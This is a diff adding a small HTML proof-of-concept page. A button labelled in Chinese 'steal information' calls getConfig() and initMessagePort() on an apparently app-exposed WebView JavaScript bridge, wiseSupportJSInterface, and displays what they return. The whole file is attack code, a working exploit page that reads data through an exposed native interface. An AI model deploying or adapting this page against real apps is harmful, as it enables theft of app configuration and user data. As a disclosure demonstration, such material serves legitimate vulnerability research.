@@ -1,0 +1,20 @@
+<html>  
+<body>      
+
+
+
+<button onclick="getLocation()">窃取信息</button></br>
+ <p id="locationInfo"></p></br>
+ <textarea id="result" name="w3review" cols="30">结果</textarea></br>
+ 
+<script>
+ 
+var result = document.getElementById("result");
+var locationInfo = document.getElementById("locationInfo");
+function getLocation(){
+ result.innerHTML= window.wiseSupportJSInterface.getConfig();
+ locationInfo.innerHTML= window.wiseSupportJSInterface.initMessagePort();
+}
+</script>
+</body>  
+</html>
